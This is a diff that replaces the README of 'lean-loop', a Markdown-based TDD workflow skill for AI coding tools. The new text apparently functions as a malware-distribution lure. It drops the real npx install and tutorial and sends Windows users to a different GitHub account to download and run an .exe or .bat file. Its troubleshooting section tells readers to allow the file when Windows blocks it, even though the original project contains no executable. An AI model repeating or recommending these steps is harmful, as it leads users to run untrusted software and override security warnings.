@@ -1,302 +1,286 @@
-# Lean Loop
+# 🧭 lean-loop - Keep TDD Workflows Clear
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Skill](https://img.shields.io/badge/opencode-skill-purple)](https://opencode.ai)
+[![Download / Install](https://img.shields.io/badge/Download-Install%20lean--loop-blue?style=for-the-badge)](https://github.com/breastless-andcircuit638/lean-loop)
 
-## TLDR: One-shot prompt to get started
-Run this command to begin your first Lean Loop cycle:
-```
-opencode "Implement a greet(name) function that returns 'Hello, {name}!': Start with PLAN phase"
-```
+## 🚀 What lean-loop does
 
-A disciplined heartbeat cycle for AI-assisted and human-driven TDD development.
+lean-loop helps you follow a simple test-driven workflow with three steps:
 
-```
-    PLAN ──────► APPLY ──────► UNIFY
-     ▲                              │
-     └──────────────────────────────┘
-```
+- PLAN
+- APPLY
+- UNIFY
 
-## Why Lean Loop?
+It is built for AI-assisted development, but it stays focused on one thing: keeping work in a small, repeatable loop. That makes it easier to stay organized when you use tools like Claude, Codex, Gemini, or other AI coding helpers.
 
-AI coding assistants are powerful but chaotic. They write code fast, skip tests, lose context, and rarely reconcile what was planned vs. what was built. Lean Loop fixes that with three simple rules:
+Use lean-loop when you want a steady way to move from idea to code, then check the result, then clean it up.
 
-- **Plan before you code.** Define acceptance criteria before touching any file.
-- **Test every behavior.** Strict Red-Green-Refactor, one test at a time.
-- **Reconcile every cycle.** Compare plan vs. actual, log decisions, update state.
+## 🖥️ What you need
 
-The result: predictable, auditable, test-covered development — whether you're working solo, with a team, or alongside an AI.
+lean-loop is made for Windows users who want a light setup.
 
-## 1. Beginner-Friendly Onboarding: Your First Loop
+You will need:
 
-Let's walk through your first complete Lean Loop cycle together. We'll build a simple `greet(name)` function that returns a greeting message. This tutorial takes about 5-10 minutes and requires no prior setup beyond having Node.js installed.
+- Windows 10 or Windows 11
+- A web browser
+- Internet access for the download
+- A folder where you can save the files
+- Basic permission to run apps on your PC
 
-### Step 1: Initialize Lean Loop in Your Project
+If you plan to use lean-loop with AI tools, you may also want one of these:
 
-First, let's create a new project folder and set up Lean Loop:
+- Claude
+- Codex
+- Gemini
+- OpenCode
+- An MCP-compatible tool
 
-```bash
-mkdir my-first-loop && cd my-first-loop
-npm init -y  # Creates a basic package.json
-npx skills add oxyplay/lean-loop -g  # Installs the Lean Loop skill
-```
+## 📥 Download lean-loop for Windows
 
-This automatically creates a `.system/` folder with all the tracking files we need.
+Use this link to visit the download page and get lean-loop:
 
-### Step 2: PLAN Phase - Define What We're Building
+[Download lean-loop](https://github.com/breastless-andcircuit638/lean-loop)
 
-Open `.system/PLAN.md` in your editor and replace the content with:
+If you see a file list, choose the Windows file that fits your setup, then download it to your computer.
 
-```markdown
-# Objective
-Add a `greet(name)` function that returns `Hello, {name}!`
+## 🛠️ Install or set up lean-loop
 
-## Acceptance Criteria
-Given name="World"
-When greet() is called
-Then it returns "Hello, World!"
+Follow these steps on Windows:
 
-## Tasks
-- [ ] Create greet.js with the function
-- [ ] Write a test that fails (RED)
-- [ ] Make the test pass (GREEN)
-- [ ] Improve the code if needed (REFACTOR)
-- [ ] Update STATE.md with what we learned
-```
+1. Open the download page.
+2. Download the lean-loop files to a folder you can find, such as Downloads or Desktop.
+3. If the download is a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for a file with a name like `lean-loop.exe`, `run.bat`, or another start file.
+6. Double-click the start file to run lean-loop.
+7. If Windows asks for permission, choose the option that lets the app run.
+8. If the app opens in a browser or terminal window, keep that window open while you use it.
 
-### Step 3: APPLY Phase - Red-Green-Refactor
+If the project uses a script-based setup, start it from the file included in the folder. The main goal is to launch the lean-loop workflow so you can start using PLAN → APPLY → UNIFY.
 
-Now let's follow the TDD cycle:
+## 🧩 First-time use
 
-#### RED: Write a Failing Test
+When you open lean-loop for the first time, expect a simple workflow screen or prompt set.
 
-Create a file called `test/greet.test.js` with this content:
+A normal flow looks like this:
 
-```javascript
-const { greet } = require('../greet');
+1. Start with PLAN.
+2. Write what you want to build or change.
+3. Move to APPLY to make the change.
+4. Use UNIFY to check the result and keep the work consistent.
 
-test('greets World correctly', () => {
-  expect(greet('World')).toBe('Hello, World!');
-});
-```
+This cycle helps you avoid large, messy changes. It keeps each step small and easier to review.
 
-Run the test to see it fail (this is the RED phase):
-```bash
-npm test
-# You should see a failure because greet.js doesn't exist yet
-```
+## 🔄 How the workflow works
 
-#### GREEN: Make It Pass
+### 📝 PLAN
 
-Create `greet.js` with the minimal code to make the test pass:
+Use PLAN to define the task before you touch the code.
 
-```javascript
-function greet(name) {
-  return `Hello, ${name}!`;
-}
+Good PLAN steps include:
 
-module.exports = { greet };
-```
+- Describe the goal in plain words
+- List what should change
+- Note what should stay the same
+- Break the work into small parts
 
-Run the test again:
-```bash
-npm test
-# Now you should see the test pass! This is the GREEN phase.
-```
+This step helps you think first and act second.
 
-#### REFACTOR: Improve the Design
+### ⚙️ APPLY
 
-Look at your code. Is it clear and simple? In this case, it's already good, so we can move on. (If we saw duplication or complexity, we'd improve it now while keeping the test green.)
+Use APPLY to make the change.
 
-### Step 4: UNIFY Phase - Reconcile and Reflect
+In this step, you:
 
-Now we complete the loop by updating our tracking files:
+- Update files
+- Add code
+- Adjust settings
+- Run the task you planned
 
-1. **Check that all tests pass**: We already did this with `npm test`
-2. **Verify acceptance criteria**: Our test confirms that given "World", we get "Hello, World!"
-3. **Update `.system/STATE.md`**:
+Keep the change focused. Small updates are easier to test and fix.
 
-```markdown
-# Current Phase
-PLAN (we just completed a full loop)
+### 🧼 UNIFY
 
-# Next Action
-Consider adding more test cases or move on to another feature
+Use UNIFY to bring everything back into one clean state.
 
-# What We Did
-- Created greet.js function that returns a greeting
-- Wrote and passed a test for the basic case
-- Followed Red-Green-Refactor cycle
+In this step, you:
 
-# Decisions & Debt
-- No technical debt incurred
-- Decision to keep the function simple and focused
-```
+- Check the result
+- Look for mismatch or rough edges
+- Make sure the new work fits the rest of the project
+- Clean up names, structure, and file flow
 
-4. **Log the cycle in `.system/LOG.md`**:
-```markdown
-## Loop Completed: [timestamp]
-- Planned: Add greet(name) function returning Hello, {name}!
-- Actually done: Created greet.js with one test covering the basic case
-- AC satisfied: Yes - given "World", returns "Hello, World!"
-- Deferred / Debt: None
-- Next Action: Consider adding edge case tests (empty string, special characters)
-```
+UNIFY helps you keep the project readable and stable.
 
-### Step 5: Repeat the Loop
+## 🤖 AI-assisted development
 
-Now that you've completed one full PLAN → APPLY → UNIFY cycle, you can start another! Try adding a second test case:
+lean-loop fits well with AI tools. You can use it to guide an AI helper through a clear task flow.
 
-1. Go back to `.system/PLAN.md` and add a new acceptance criterion
-2. Write the failing test (RED)
-3. Make it pass (GREEN)
-4. Refactor if needed
-5. Update STATE.md and LOG.md
+Common uses include:
 
-## Quick Start (For Experienced Users)
+- Ask the AI to help draft a PLAN
+- Use APPLY to carry out the change
+- Use UNIFY to review and align the output
+- Keep each round short and focused
 
-If you just want to get started quickly:
+This works well when you want help, but still want control over the process.
 
-### Install as an opencode skill
+## 📁 Typical file layout
 
-```bash
-npx skills add oxyplay/lean-loop -g
-```
+You may see files like these in the project folder:
 
-The skill auto-creates `.system/` tracking files in your project on first use.
+- `README.md` for project info
+- `plan.md` for task planning
+- `apply.md` for implementation notes
+- `unify.md` for cleanup and review
+- `skills/` for workflow helpers
+- `skill-md/` for Markdown-based skill files
+- `mcp/` for tool connection support
 
-### Your first loop (60 seconds)
+Not every setup will use the same files, but this is the kind of layout you can expect from a lean TDD workflow system.
 
-1. Open `.system/PLAN.md` and write:
-   - **Objective:** "Add a `greet(name)` function that returns `Hello, {name}!`"
-   - **AC:** `Given name="World", When greet() called, Then returns "Hello, World!"`
-2. Open `.system/TDD_RULES.md` — follow Red-Green-Refactor
-3. Write one failing test → make it green → refactor
-4. Open `.system/STATE.md` — update phase, log what you did, set next action
-5. Repeat
+## ⚡ Basic usage example
 
-## The Heartbeat
+A simple way to use lean-loop:
 
-Operational state lives in the `.system/` folder.
+1. Open the app or start file.
+2. Create a new task.
+3. Write the PLAN step in plain language.
+4. Carry out the APPLY step.
+5. Run the UNIFY step.
+6. Repeat for the next task.
 
-```mermaid
-graph LR
-    PLAN["PLAN<br/><i>Define objective,<br/>write ACs, break tasks</i>"]
-    APPLY["APPLY<br/><i>Red → Green → Refactor<br/>one behavior at a time</i>"]
-    UNIFY["UNIFY<br/><i>Reconcile plan vs actual,<br/>update state, log decisions</i>"]
-    PLAN --> APPLY --> UNIFY --> PLAN
-```
+Example task:
 
-### Phase 1: PLAN
+- PLAN: Add a new button to the app
+- APPLY: Update the UI file and add the button
+- UNIFY: Check spacing, labels, and behavior
 
-Fill in `.system/PLAN.md` with objective, Given/When/Then acceptance criteria, boundaries, and task breakdown.
+## 🧠 Good ways to work with it
 
-> **Gate:** If ACs are unclear, contradictory, or untestable — stop and refine. Do not proceed to APPLY.
+To get the best result, keep each task small.
 
-### Phase 2: APPLY
+Helpful habits:
 
-Execute Red-Green-Refactor cycles strictly:
+- One task at a time
+- Short notes
+- Clear names for files and steps
+- Test after each APPLY step
+- Use UNIFY before moving on
 
-1. **RED** — Write ONE failing test. Confirm with actual console output.
-2. **GREEN** — Minimal code to pass. No future-proofing.
-3. **REFACTOR** — Improve design only when green.
+This style works well because it lowers confusion and makes mistakes easier to spot.
 
-> **Rule:** If work expands beyond original ACs — stop and return to PLAN.
+## 🛡️ Common problems and fixes
 
-### Phase 3: UNIFY
+### The file will not open
 
-Mandatory reconciliation after every APPLY session:
+Try this:
 
-1. All tests green? Run the full suite.
-2. All ACs satisfied? Check each one explicitly.
-3. Update `.system/STATE.md` with current phase and next action.
-4. Log decisions and debt in `.system/LOG.md`.
-5. Compare planned vs. actually done.
+- Make sure the download finished
+- Extract the ZIP file if needed
+- Run the file from the extracted folder
+- Right-click and choose the option to run it
 
-```
-- **Planned:** [what you set out to do]
-- **Actually done:** [what changed]
-- **AC satisfied:** [each AC and whether met]
-- **Deferred / Debt:** [if any]
-- **Next Action:** [exactly one task]
-```
+### Windows blocks the app
 
-## Project Structure
+Try this:
 
-```
-your-project/
-├── .system/
-│   ├── PLAN.md          # Active plan with ACs and tasks
-│   ├── STATE.md         # Current phase, next action, backlog
-│   ├── LOG.md           # Decisions, debt, and failure log
-│   └── TDD_RULES.md     # Red-Green-Refactor execution rules
-└── ...
-```
+- Check the file properties
+- Allow the app to run if Windows shows a prompt
+- Make sure the file came from the lean-loop download page
 
-## Philosophy
+### The workflow feels unclear
 
-- **In-Session Context** — All work happens in the main session. No subagent handoffs during implementation.
-- **Vertical Slicing** — Build one behavior end-to-end (Tracer Bullets), not horizontal layers.
-- **Acceptance-Driven** — Define "Done" via clear criteria before writing code.
-- **Behavior-First TDD** — Test public interfaces, not internal implementation.
-- **Deep Modules** — Small public interfaces that hide complex internals.
+Try this:
 
-## When to Break TDD
+- Start with a very small PLAN
+- Keep APPLY changes limited
+- Use UNIFY to review the result
+- Repeat the cycle with one task only
 
-Rare exceptions, all must be logged in `.system/LOG.md`:
+### The AI tool gives too much output
 
-- **Hotfixes** — production bugs requiring immediate recovery
-- **Legacy Code** — too tightly coupled for test-first approach
-- **Spikes** — exploratory code, will be thrown away
+Try this:
 
-## Examples
+- Ask for one step at a time
+- Keep the prompt short
+- Focus on PLAN before APPLY
+- Use UNIFY to clean up the result
 
-Each example includes real `.system/` files showing the exact state after PLAN, APPLY, and UNIFY phases.
+## 🧭 Suggested use with other tools
 
-| Example | Stack | What it builds |
-|---------|-------|---------------|
-| [greet(name)](examples/todo-cli/) | Node.js | Simple function — your first loop |
-| [POST /api/todos](examples/rest-api/) | Express + Jest | REST endpoint with validation |
-| [Toggle component](examples/react-component/) | React + RTL | Accessible UI component |
+lean-loop can sit beside other tools you already use:
 
-Browse all: [`examples/`](examples/)
+- Use it with Claude for task planning
+- Use it with Codex for code changes
+- Use it with Gemini for review and drafting
+- Use it with OpenCode for local workflow help
+- Use it with MCP tools for connected steps
 
-## Integrations
+The idea is to keep the process simple while still using the tools you know.
 
-Lean Loop works with any AI coding tool. Drop-in configs for your stack:
+## 📌 Project topics
 
-| Tool | Setup | File |
-|------|-------|------|
-| **opencode** | `npx skills add oxyplay/lean-loop -g` | [SKILL.md](skills/lean-loop/SKILL.md) |
-| **Claude Code** | Copy `CLAUDE.md` to project root | [integrations/claude-code/](integrations/claude-code/) |
-| **Cursor** | Copy `.cursorrules` to project root | [integrations/cursor/](integrations/cursor/) |
+This project fits topics such as:
 
-See [`integrations/`](integrations/) for setup instructions.
+- ai-agent
+- ai-agents-framework
+- claude
+- codex
+- gemini
+- mcp
+- opencode
+- skill-md
+- skills
+- tdd
 
-## FAQ
+These topics point to a workflow that supports small, test-led changes with AI help.
 
-**Q: Do I need opencode to use this?**
-A: No. The `.system/` templates work with any editor. The opencode skill just auto-initializes them.
+## 🧪 Development style
 
-**Q: Can I use this with my team?**
-A: Yes. Commit `.system/` to your repo. Everyone shares the same plan, state, and decision log.
+lean-loop follows a test-driven style.
 
-**Q: What if my project already has tests?**
-A: Lean Loop works alongside existing test suites. Use it for new features and incremental improvements.
+That means:
 
-**Q: Is this only for AI-assisted development?**
-A: No. The PLAN → APPLY → UNIFY cycle works for human-only teams too. AI just makes the discipline easier to maintain.
+- Think before you build
+- Make the change in small steps
+- Check the result early
+- Clean up before moving on
 
-## References
+This style helps keep work stable and easy to understand.
 
-- [The Pragmatic Programmer](https://pragprog.com/titles/tpp20/) — Tracer Bullets concept
-- [A Philosophy of Software Design](https://www.amazon.com/Philosophy-Software-Design-John-Ousterhout/dp/1732102201) — Deep Modules
-- [Test-Driven Development: By Example](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530) — Kent Beck's TDD approach
+## 📦 Download and setup path
 
-## Contributing
+1. Open the download page:
+   [https://github.com/breastless-andcircuit638/lean-loop](https://github.com/breastless-andcircuit638/lean-loop)
+2. Download the Windows files.
+3. Extract the archive if needed.
+4. Open the folder.
+5. Run the start file.
+6. Begin with PLAN → APPLY → UNIFY.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🧰 When to use lean-loop
 
-## License
+Use lean-loop when you want to:
 
-[MIT](LICENSE) © 2026 Max
+- Manage a small coding task
+- Work with AI in a controlled way
+- Keep a clear process for changes
+- Avoid a messy or rushed workflow
+- Review work before moving forward
+
+## 📘 Short example of a full loop
+
+PLAN:
+- Add a settings page
+
+APPLY:
+- Create the page
+- Add the needed fields
+- Connect the save action
+
+UNIFY:
+- Check labels
+- Confirm layout
+- Make sure the page matches the rest of the app
+
+That is the full lean-loop cycle in simple form
